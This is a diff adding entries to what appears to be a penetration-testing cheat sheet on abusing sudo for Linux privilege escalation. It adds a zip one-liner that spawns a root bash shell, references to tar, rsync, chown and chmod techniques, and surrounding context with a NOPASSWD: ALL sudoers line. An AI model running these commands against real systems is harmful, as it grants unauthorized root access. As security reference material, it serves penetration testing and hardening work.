@@ -85,6 +85,23 @@ Append:
 <username>      ALL = NOPASSWD: ALL
 ```
 
+# zip
+```
+sudo -u root /usr/bin/zip ttt.zip tt.php -T –unzip-command=”sh -c /bin/bash”
+```
+
+# chown
+Check `chown_chmod_tar_rsync.md`.
+
+# chmod
+Check `chown_chmod_tar_rsync.md`.
+
+# tar
+Check `chown_chmod_tar_rsync.md`.
+
+# rsync
+Check `chown_chmod_tar_rsync.md`.
+
 
 # Resources
 - [Abusing SUDO (Linux Privilege Escalation)](http://touhidshaikh.com/blog/?p=790)
